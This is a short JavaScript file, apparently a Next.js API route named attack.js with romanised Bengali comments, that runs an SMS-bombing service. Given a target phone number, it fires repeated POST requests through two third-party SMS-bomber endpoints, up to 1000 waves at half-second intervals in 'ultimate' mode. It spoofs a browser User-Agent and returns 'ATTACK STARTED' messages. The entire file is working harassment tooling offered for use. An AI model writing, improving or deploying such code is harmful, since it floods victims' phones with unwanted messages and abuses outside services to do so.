// pages/api/attack.js

export default async function handler(req, res) {
  if (req.method !== 'POST') return res.status(405).send('Method not allowed');

  const { number, amount, isUltimate } = req.body;

  // Target URLs (Amra ekhane direct API hit korar chesta korbo)
  const targetLinks = [
    'https://shadowx-sms-bomber.onrender.com/api/send', // Amra API endpoint guess korchi
    'https://nuke-sms-bomber.pages.dev/api/attack'    // Amra API endpoint guess korchi
  ];

  const runAttack = async () => {
    // Ultimate mode e 2 SMS per second (500ms delay)
    const totalWaves = isUltimate ? 1000 : amount; 
    const delay = isUltimate ? 500 : 2000; 

    for (let i = 0; i < totalWaves; i++) {
      // Amra ekshathe duiti link e request pathabo
      const attackPromises = targetLinks.map(link => 
        fetch(link, {
          method: 'POST',
          headers: { 
            'Content-Type': 'application/json',
            'Accept': 'application/json',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
          },
          body: JSON.stringify({
            number: number,
            amount: 1, // Protibar 1ta kore SMS pathabe
            country: "BD",
            service: "whatsapp",
            msg: "ULTIMATE ATTACK"
          }),
        }).catch(err => console.log("Wave Error:", err.message))
      );

      await Promise.all(attackPromises);

      // Delay control
      await new Promise(resolve => setTimeout(resolve, delay));
    }
  };

  // Background e attack start
  runAttack();

  return res.status(200).json({ 
    success: true, 
    message: isUltimate ? "ULTIMATE ATTACK STARTED! 🚀" : "ATTACK STARTED! 🔥" 
  });
}
